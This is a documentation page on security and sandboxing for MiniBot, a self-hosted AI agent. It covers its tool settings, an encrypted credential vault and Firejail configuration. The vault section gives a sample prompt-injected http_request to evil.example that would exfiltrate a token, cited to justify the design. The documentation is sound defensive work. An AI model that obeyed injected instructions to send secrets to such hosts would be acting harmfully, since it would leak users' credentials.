Security & Sandboxing
=====================

.. meta::
   :description: How Minibot keeps a self-hosted AI agent safe: minimal tool surface, sandboxing, path restrictions, and sandbox modes for Python and Bash.
   :keywords: self-hosted AI agent security, AI sandboxing, safe Python agent, auditable AI agent

MiniBot exposes a minimal tool surface by default. The most sensitive capabilities are
``python_execute``, ``bash``, and ``apply_patch`` — they can run arbitrary code or edit
host files when enabled.

Recommendations
---------------

- Disable ``tools.python_exec`` unless you need it.
- Disable ``tools.bash`` unless you need direct shell access.
- Keep ``tools.bash.pass_parent_env = false`` (the default). Setting it to ``true`` makes every
  variable the daemon runs with — including any ``${ENV_VAR}`` secret used in ``config.toml`` —
  readable with a single ``env`` call. Add the specific keys a command needs to ``env_allowlist``
  instead.
- Keep ``tools.apply_patch.restrict_to_workspace = true`` unless unrestricted edits are required.
- Keep ``tools.file_storage.allow_outside_root = false`` to prevent path traversal.
- Prefer explicit sandbox isolation for untrusted code (``sandbox_mode``: ``none``, ``basic``, ``rlimit``, ``cgroup``, or ``jail``; default is ``basic``).
- Run the daemon as a non-privileged user; mount only the data directory in Docker.
- Store credentials in the ``[vault]`` rather than in ``config.toml`` or the process environment.

Credential vault
----------------

The vault keeps credentials encrypted at rest (AES-256-GCM, key derived from a password with
scrypt) and out of the LLM's reach. Enable it with ``[vault] enabled = true`` after installing
the ``vault`` extra, and write secrets with ``minibot vault edit`` (see :doc:`cli`).

Secrets are **destination-bound**. An administrator binds a secret to one consumer in
configuration and that consumer resolves it itself:

.. code-block:: toml

   [[tools.mcp.servers]]
   name = "github"
   transport = "http"
   url = "https://api.githubcopilot.com/mcp/"
   auth_secret = "github"

The model's only vault-related capability is ``list_secrets``, which returns names. There is no
``get_secret`` tool and no ``secret://`` reference the model can write into a tool argument — that
would turn the vault into a decryption oracle, letting a prompt-injected
``http_request(url="https://evil.example", headers={...})`` exfiltrate a token to an
attacker-chosen destination without the model ever seeing its value.

Unlocking
~~~~~~~~~

The password is read from ``[vault] password_file``, else ``MINIBOT_VAULT_PASSWORD``, else an
interactive prompt at startup. **The prompt is the recommended method**: it is the only one where
no password material touches disk or the process environment. The other two are supported for
unattended deployments, but a file is readable by any tool that can read the filesystem — the
``bash`` tool has no filesystem jail — and that file or variable then becomes the thing to
protect instead of the vault.

The vault file is excluded from git and the Docker build context by default (``*.vault.yml``).

Limits
~~~~~~

- **This protects secrets at rest and from the LLM's own tool calls.** It does not protect against
  a fully compromised daemon process reading its own memory (``/proc/<pid>/mem``) — the same trust
  boundary as any self-hosted secret manager running as one OS user.
- No rotation, no recovery, no hot-reload: a forgotten password means starting over, and editing
  the vault while the daemon runs needs a restart to take effect.
- ``${ENV_VAR}`` config secrets (``token_env``, static MCP headers) are a separate, older
  mechanism and are unaffected. The two coexist.
- Task workers get no vault: they load no bundled extensions and build their own tool set, so no
  vault-backed credential exists in a worker process.

Jail Mode (Firejail)
--------------------

``jail`` mode wraps the Python process with an arbitrary command prefix (e.g. ``firejail``):

.. code-block:: toml

   [tools.python_exec.jail]
   enabled = true
   command_prefix = [
     "firejail",
     "--private=/srv/minibot-sandbox",
     "--quiet",
     # "--net=none",  # restrict network access from jailed processes
   ]

Firejail + artifact export example
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. Create shared directory::

    mkdir -p /home/myuser/mybot/data/files/jail-shared
    chmod 700 /home/myuser/mybot/data/files/jail-shared

2. Configure Python exec:

.. code-block:: toml

   [tools.python_exec]
   sandbox_mode = "jail"
   artifacts_allow_in_jail = true
   artifacts_jail_shared_dir = "/home/myuser/mybot/data/files/jail-shared"

3. Configure Firejail wrapper:

.. code-block:: toml

   [tools.python_exec.jail]
   enabled = true
   command_prefix = [
     "firejail",
     "--quiet",
     "--noprofile",
     "--caps.drop=all",
     "--seccomp",
     "--whitelist=/home/myuser/mybot/data/files/jail-shared",
     "--read-write=/home/myuser/mybot/data/files/jail-shared",
     "--whitelist=/home/myuser/mybot/tools_venv",
   ]

Notes:

- ``artifacts_jail_shared_dir`` and the Firejail whitelist path must be identical.
- ``tools.python_exec.python_path`` (or ``venv_path``) must point to an interpreter visible inside Firejail.
- ``--noprofile`` avoids host distro defaults that may block home directory executables.
- Ensure ``firejail`` is available in the runtime image or on the host.
